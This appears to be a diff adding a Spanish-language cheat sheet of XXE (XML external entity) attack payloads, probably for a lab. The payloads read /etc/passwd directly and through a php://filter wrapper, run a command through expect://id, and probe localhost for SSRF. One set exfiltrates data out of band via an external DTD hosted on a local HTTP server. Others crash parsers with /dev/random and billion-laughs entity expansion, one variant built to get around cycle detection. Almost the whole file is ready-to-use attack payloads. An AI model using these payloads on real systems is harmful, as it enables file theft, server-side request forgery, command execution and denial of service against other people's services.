@@ -1,0 +1,94 @@
+apt-get install php-xml
+service apache2 restart
+
+###########LFI###########
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE hola [ <!ELEMENT hola ANY>
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<xml><cosas>&xxe;</cosas></xml>
+
+
+
+###########LFI por PHP###########
+
+<?xml version="1.0"?>
+<!DOCTYPE hola [
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>
+<xml><cosas>&xxe;</cosas></xml>
+
+
+
+###########RCE###########
+
+<?xml version="1.0"?>
+<!DOCTYPE hola [
+<!ENTITY xxe SYSTEM "expect://id">]>
+<xml><cosas>&xxe;</cosas></xml>
+
+
+###########BLIND con llamada a casa########### Sirve para SSRF/CSRF
+
+<?xml version="1.0"?>
+<!DOCTYPE hola [
+<!ENTITY xxe SYSTEM "http://localhost:8080/">]>
+<xml><cosas>&xxe;</cosas></xml>
+
+########### OOB Exfiltration #################
+python -m http.server 80 &
+
+<?xml version="1.0"?>
+<!DOCTYPE data SYSTEM "http://172.17.0.3/exfiltrar.dtd" >
+<xml><cosas>&xxe;</cosas></xml>
+
+
+###########DoS Ficheros problemáticos###########
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE hola [ <!ELEMENT hola ANY>
+<!ENTITY xxe SYSTEM "file:///dev/random" >]>
+<xml><cosas>&xxe;</cosas></xml>
+
+###########DoS Billion laughs###########
+
+<?xml version="1.0"?><!DOCTYPE payload [
+<!ENTITY A "lol ">
+]>
+<xml><cosas>&A;</cosas></xml>
+
+
+<?xml version="1.0"?><!DOCTYPE payload [
+<!ENTITY A "lol ">
+]>
+<xml><cosas>&A;&A;&A;&A;&A;&A;&A;&A;</cosas></xml>
+
+
+<?xml version="1.0"?><!DOCTYPE payload [
+<!ENTITY A "lol ">
+<!ENTITY B "&A;&A;&A;&A;&A;&A;&A;&A;">
+]>
+<xml><cosas>&B;&B;&B;&B;&B;&B;&B;&B;</cosas></xml>
+
+
+<?xml version="1.0"?><!DOCTYPE payload [
+<!ELEMENT cosas (#PCDATA)>
+<!ENTITY A "lol ">
+<!ENTITY B "&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;">
+<!ENTITY C "&B;&B;&B;&B;&B;&B;&B;&B;&B;&B;">
+<!ENTITY D "&C;&C;&C;&C;&C;&C;&C;&C;&C;&C;">
+<!ENTITY E "&D;&D;&D;&D;&D;&D;&D;&D;&D;&D;">
+<!ENTITY F "&E;&E;&E;&E;&E;&E;&E;&E;&E;&E;">
+<!ENTITY G "&F;&F;&F;&F;&F;&F;&F;&F;&F;&F;">
+<!ENTITY H "&G;&G;&G;&G;&G;&G;&G;&G;&G;&G;">
+<!ENTITY I "&H;&H;&H;&H;&H;&H;&H;&H;&H;&H;">
+<!ENTITY J "&I;&I;&I;&I;&I;&I;&I;&I;&I;&I;">
+]>
+<xml><cosas>&D;</cosas></xml>
+
+Esta no funciona si detecta ciclos por defecto, pero se puede hacer así
+
+<?xml version="1.0"?><!DOCTYPE payload [
+<!ELEMENT cosas (#PCDATA)>
+<!ENTITY A "aaaaaaa[...]aaaaaaa">
+<!ENTITY B "&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;&A;">
+]>
+<xml><cosas>&B;</cosas></xml>
